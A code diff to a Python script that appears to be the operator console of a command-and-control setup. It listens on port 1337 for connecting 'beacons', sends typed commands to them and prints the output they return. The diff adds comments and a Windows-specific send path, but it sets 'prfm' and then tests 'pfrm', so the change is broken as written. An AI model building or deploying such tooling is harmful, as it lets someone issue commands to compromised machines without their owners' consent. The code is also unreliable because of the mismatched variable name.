@@ -2,10 +2,13 @@ from signal import signal, SIGINT
 from sys import exit
 import socket
 import time
+import platform
 
+# Create the socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 print("Socket successfully created")
 
+# Bind to the port
 port = 1337
 
 s.bind(('', port))
@@ -20,8 +23,10 @@ def handler(signal_recieved, frame):
   exit(0)
 
 def main():
+  prfm = platform.system()
   while True:
     print("Listening for beacon...")
+    # Waits to continue until connection is accepted
     c, addr = s.accept()
     print("Beacon connected from:", addr)
 
@@ -38,11 +43,16 @@ def main():
     print(data_recv)
 
     strToSend = input("> ")
+    # Send a string to the beacon
     binCommand = (strToSend.ljust(1024, '\0')).encode("utf-8")
     # print("Command len: " + str(len(binCommand)))
-    c.send(binCommand, len(binCommand))
+    if pfrm == 'Windows':
+      c.send(binCommand)
+    else:
+      c.send(binCommand, len(binCommand))
 
     if (not strToSend == 'quit'):
+      # Receive output one character at a time until the end output character (0xFF)
       output = bytes.decode(c.recv(1))
       while 1:
         data = c.recv(1)
@@ -50,7 +60,7 @@ def main():
           break
         output += bytes.decode(data)
       print(output)
-    
+    # Close the socket connection
     c.close()
 
 if __name__ == "__main__":
